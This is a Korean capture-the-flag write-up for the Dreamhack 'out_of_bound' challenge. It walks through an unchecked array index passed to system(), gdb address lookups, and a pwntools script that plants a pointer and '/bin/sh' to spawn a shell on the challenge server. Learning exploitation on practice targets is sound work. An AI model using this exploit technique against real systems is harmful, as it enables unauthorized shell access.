out_of_bound
===

# Description

> 이 문제는 서버에서 작동하고 있는 서비스(out_of_bound)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득하세요.
> “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.

# Source code

~~~
\#include <stdio.h>
\#include <stdlib.h>
\#include <signalA.h>
\#include <unistd.h>
\#include <string.h>
char name[16];
char *command[10] = { "cat",
"ls",
"id",
"ps",
"file ./oob" };
void alarm_handler()
{
puts("TIME OUT");
exit(-1);
}
void initialize()
{
setvbuf(stdin, NULL, _IONBF, 0);
setvbuf(stdout, NULL, _IONBF, 0);
signal(SIGALRM, alarm_handler);
alarm(30);
}
int main()
{
int idx;
initialize();
printf("Admin name: ");
read(0, name, sizeof(name));
printf("What do you want?: ");
scanf("%d", &idx);
system(command[idx]);
return 0;
}
~~~

system이라는 명령어 에서는 안에있는 명령어를 실행한다. command는 index를 확인하지 않기 때문에 이를 이용한다. 그런데 command는 포인터 이므로 포인터를 이용해야 한다. 따라서 name[0]~name[3]은 name[4]의 주솟값을 넣고, name[4]에 /bin/sh를 넣는다. command의 index를 이용해 이 코드가 실행되도록 한다. 

# Result

~~~ 
Dump of assembler code for function main:
0x080486cb <+0>:	lea    ecx,[esp+0x4]
0x080486cf <+4>:	and    esp,0xfffffff0
0x080486d2 <+7>:	push   DWORD PTR [ecx-0x4]
0x080486d5 <+10>:	push   ebp
0x080486d6 <+11>:	mov    ebp,esp
0x080486d8 <+13>:	push   ecx
0x080486d9 <+14>:	sub    esp,0x14
0x080486dc <+17>:	mov    eax,gs:0x14
0x080486e2 <+23>:	mov    DWORD PTR [ebp-0xc],eax
0x080486e5 <+26>:	xor    eax,eax
0x080486e7 <+28>:	call   0x804867b <initialize>
0x080486ec <+33>:	sub    esp,0xc
0x080486ef <+36>:	push   0x8048811
0x080486f4 <+41>:	call   0x80484b0 <printf@plt>
0x080486f9 <+46>:	add    esp,0x10
0x080486fc <+49>:	sub    esp,0x4
0x080486ff <+52>:	push   0x10
0x08048701 <+54>:	push   0x804a0ac
0x08048706 <+59>:	push   0x0
0x08048708 <+61>:	call   0x80484a0 <read@plt>
0x0804870d <+66>:	add    esp,0x10
0x08048710 <+69>:	sub    esp,0xc
0x08048713 <+72>:	push   0x804881e
0x08048718 <+77>:	call   0x80484b0 <printf@plt>
0x0804871d <+82>:	add    esp,0x10
0x08048720 <+85>:	sub    esp,0x8
0x08048723 <+88>:	lea    eax,[ebp-0x10]
0x08048726 <+91>:	push   eax
0x08048727 <+92>:	push   0x8048832
0x0804872c <+97>:	call   0x8048540 <__scanf@plt>
0x08048731 <+102>:	add    esp,0x10
0x08048734 <+105>:	mov    eax,DWORD PTR [ebp-0x10]
0x08048737 <+108>:	mov    eax,DWORD PTR [eax*4+0x804a060]
0x0804873e <+115>:	sub    esp,0xc
0x08048741 <+118>:	push   eax
0x08048742 <+119>:	call   0x8048500 <system@plt>
0x08048747 <+124>:	add    esp,0x10
0x0804874a <+127>:	mov    eax,0x0
0x0804874f <+132>:	mov    edx,DWORD PTR [ebp-0xc]
0x08048752 <+135>:	xor    edx,DWORD PTR gs:0x14
0x08048759 <+142>:	je     0x8048760 <main+149>
0x0804875b <+144>:	call   0x80484e0 <__stack_chk_fail@plt>
0x08048760 <+149>:	mov    ecx,DWORD PTR [ebp-0x4]
0x08048763 <+152>:	leave  
0x08048764 <+153>:	lea    esp,[ecx-0x4]
0x08048767 <+156>:	ret 
~~~

소스코드는 다음과 같다. 입력이 되는 61번 read와 system의 119번을 보고 name과 commend의 주솟값을 알아보겠다.

~~~
gdb-peda$ x 0x804a0ac
0x804a0ac <name>:	0x00000000
~~~

read의 인자로 받는 0x804a0ac가 바로 name이다.

~~~
gdb-peda$ x 0x804a060
0x804a060 <command>:	0x080487f0
~~~

system의 인자로 받는 0x804a060가 command이다.

~~~ 
gdb-peda$ x/s 0x080487f0
0x80487f0:	"cat"
~~~

command는 포인터 배열이기 때문에 이것이 가리키고 있는 0x080487f0은 문자열로 표현하면 첫번째 원소인 cat이다.

~~~
0x08048734 <+105>:	mov    eax,DWORD PTR [ebp-0x10]
0x08048737 <+108>:	mov    eax,DWORD PTR [eax*4+0x804a060]
0x0804873e <+115>:	sub    esp,0xc
0x08048741 <+118>:	push   eax
0x08048742 <+119>:	call   0x8048500 <system@plt>
~~~

포인터의 크기가 4byte인 것을 이용해 eax에 index를 넣고 그만큼 곱한다. 이때 eax는 ebp-0x10이다.

~~~
0x08048723 <+88>:	lea    eax,[ebp-0x10]
0x08048726 <+91>:	push   eax
0x08048727 <+92>:	push   0x8048832
0x0804872c <+97>:	call   0x8048540 <__isoc99_scanf@plt>
~~~

ebp-0x10은 eax를 통해 scanf로 들어간다. 따라서 ebp-0x10이 가리키고 있는 값이 idx이다.

그런데 0x8048832이 idx라고 생각할 수도 있다.

~~~
gdb-peda$ x 0x8048832
0x8048832:	Cannot access memory at address 0x8048835
gdb-peda$ x/s 0x8048832
0x8048832:	"%d"
~~~

0x8048832는 %d이므로 ebp-0x10이 idx임이 확실하다.

~~~
from pwn import *

p=remote("host1.dreamhack.games",8257)
payload=p32(0x804a0b0)
payload+="/bin/sh"
p.recvuntil(": ")
p.sendline(payload)
p.recvuntil(": ")
p.sendline("19")
p.interactive()
~~~

out_of_bound를 공격하기 위한 코드는 다음과 같다.

# Learned

> gdb-peda를 이용하면 함수에 들어가는 인자를 알 수 있다.
>
> remote(주소,포트)를 통해 원격 저장소에 연결 할 수 있다.
>
> prcess(파일주소)를 통해 local에 있는 파일에 연결할 수 있다.
>
> p32는 32bit little endian으로 packing해준다. 64bit은 p64를 이용한다.
>
> recvuntil은 주어진 문자열이 나올 때 까지 받는다.
>
> sendline은 주어진 문자열을 보낸다.
>
> interactive는 연결된 곳에 상호작용 할 수 있게 한다.

~~~

~~~